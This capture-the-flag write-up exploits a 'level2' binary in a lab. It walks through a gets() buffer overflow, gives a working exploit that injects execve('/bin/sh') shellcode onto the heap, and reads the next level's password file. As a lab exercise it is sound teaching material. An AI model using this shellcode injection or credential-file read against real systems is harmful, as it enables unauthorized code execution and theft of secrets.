# level2

Functions found
|LIBC|user|
|-|-|
|printf|main|
|fflush|frame_dummy|
|gets||
|strdup||
|puts||

As we saw before `gets` can be exploited for it's capactiy to cause **buffer overflows**.
`printf` can be exploited in some specific cases, see the man.

```
BUGS
       Because sprintf() and vsprintf()  assume  an  arbitrarily  long  string,
       callers  must be careful not to overflow the actual space; this is often
       impossible to assure.  Note that the length of the strings  produced  is
       locale-dependent  and  difficult  to  predict.   Use  snprintf() and vs‐
       nprintf() instead (or asprintf(3) and vasprintf(3)).

       Code such as printf(foo); often indicates a bug, since foo may contain a
       % character.  If foo comes from untrusted user input, it may contain %n,
       causing the printf() call to write to memory  and  creating  a  security
       hole.
```

In our case, the second paragraph in particular could be exploited.

This time we will use **Ghidra** from the start.
After extracting our binary using [the extracter script](../tools/extract_binary.sh), open it and analyse it.

Once again, *frame_dummy* does nothing.
Main only calls the *p* function.

The *p* function has a call to *gets* in an unguarded static buffer, so buffer overflow it is.
If we use our pattern generator, it tells us that we need an offset of 80.
What's interesting is that this time, is that **Ghidra** writes the return address as a visible variable.
We can see that a **logical and** is applied to this variable with the hexadecimal number `0xb0000000`.

If this **and** comparison matches, this value is then printed with printf.
What this means is that any address will be printed as long as it contains `0xb0000000`. This match also calls `exit()`, this means that if we fall into this trap, our injection will not work.
By convention on **32bits** machines, addresses that match the `0xb0000000` mask are located on the **stack memory**. This means that we have to write an address to heap memory.

So we have our offset which is 80, but this time there is no *run* function that calls to a `system()` or `execv()` function. How can we execute a shell inside our program then ?
Well since we have no stack, we'll have to use the heap! Fortunately, we have access to the *strdup()* LIBC function that will allocate our *gets* buffer to the heap.
Then what we have to do is overwrite the return address to a "*function*" we wrote on the heap. We will make use of something called **Shellcode**

> Shellcode is executable code intended to be used as a payload for exploiting a software vulnerability.
Source, the [shellcode wikipedia page](https://en.wikipedia.org/wiki/Shellcode).

Basically, it means we write a function on the heap (or stack), and trick the program into thinking it is a real function.

Now we need to find the where *strdup* will allocate our shellcode, this address will be the return address we'll use. To do this we use the `ltrace` command. It is a Library call tracer.
So, we just run our binary with ltrace, and it will give us the address.
```sh
$ ltrace ./level2
foobar
[...]
strdup("foobar")                                      = 0x0804a008
[...]
```

As usual, we take this address `0x0804a008`, convert it to little endian `0x08a00408` and then to an injectable address `x08\xa0\x04\x08`.
So we go to our shellcode aggregator (using the Internet Archive's wayback machine), and now we give our thanks to [Jean Pascal Pereira](https://web.archive.org/web/20260225182400/https://shell-storm.org/shellcode/files/shellcode-811.html).

```python
(cat <(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 52 * 'a' + '\x08\xa0\x04\x08'") -) | ./level2
```

This command did not return prompt, let's check if our **code injection** worked.
```sh
whoami
level3
```
Good, now let's just extract the password and switch to the next level.

```sh
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Note :
If we wanted to trip the address trap, we could use this command where we write an address that matches the **logical and**.
```python
(cat <(python -c "print 'a' * 80 + '\xbb\xbb\xbb\xbb'") -) | ./level2
```

Note 2:
I tried a dozen different shellcodes before finding one that worked...
